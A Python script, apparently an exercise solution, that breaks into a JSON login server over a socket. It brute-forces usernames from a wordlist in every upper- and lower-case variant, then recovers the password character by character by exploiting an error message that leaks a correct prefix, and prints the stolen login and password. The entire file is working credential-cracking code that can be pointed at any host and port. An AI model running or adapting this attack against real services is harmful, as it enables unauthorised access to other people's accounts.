import socket
from sys import argv
from itertools import product
from json import loads, dumps
from string import ascii_letters, digits


def login_combinations(login):
    for combination in product(*([c.upper(), c.lower()] for c in login)):
        yield "".join(combination)


def login_generator(filename):
    with open(filename, "r") as f:
        for line in f:
            yield from login_combinations(line.strip())


# Try all logins with an empty(string) password. The server uses JSON to send messages.
def try_login():
    for login in login_generator("logins.txt"):
        client_socket.send(dumps({"login": login, "password": " "}).encode())
        response = loads(client_socket.recv(1024).decode())
        if response["result"] == "Wrong password!":
            return login


# When you find the login, try out every possible password of length 1.
# The ‘exception’ message pops up when the symbols match the beginning of the correct one.
def try_password(login):
    password = ""
    while True:
        for symbol in ascii_letters + digits:
            test_password = password + symbol
            request_data = {"login": login, "password": test_password}
            client_socket.send(dumps(request_data).encode())
            response = loads(client_socket.recv(1024).decode())
            if response["result"] == "Connection success!":
                return test_password
            elif response["result"] == "Exception happened during login":
                password += symbol
                break


with socket.socket() as client_socket:
    client_socket.connect((argv[1], int(argv[2])))
    login = try_login()
    password = try_password(login)
    print(dumps({"login": login, "password": password}))
